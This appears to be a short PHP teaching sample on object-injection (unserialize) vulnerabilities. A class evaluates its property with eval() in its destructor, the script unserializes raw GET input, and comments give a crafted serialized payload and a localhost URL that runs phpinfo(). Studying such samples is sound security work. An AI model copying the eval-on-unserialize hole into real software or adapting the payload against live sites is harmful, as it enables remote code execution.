<?php 
class demo{
	var $test = "lufei";
	function __destruct(){
		eval($this->test);
	}
}
unserialize($_GET['code']);

/* class demo{
	var $test = "phpinfo();";
}

$class = new demo();

print_r(serialize($class)); */

//O:4:"demo":1:{s:4:"test";s:10:"phpinfo();";}
//http://127.0.0.1/test.php?code=O:4:"demo":1:{s:4:"test";s:10:"phpinfo();";}
?>
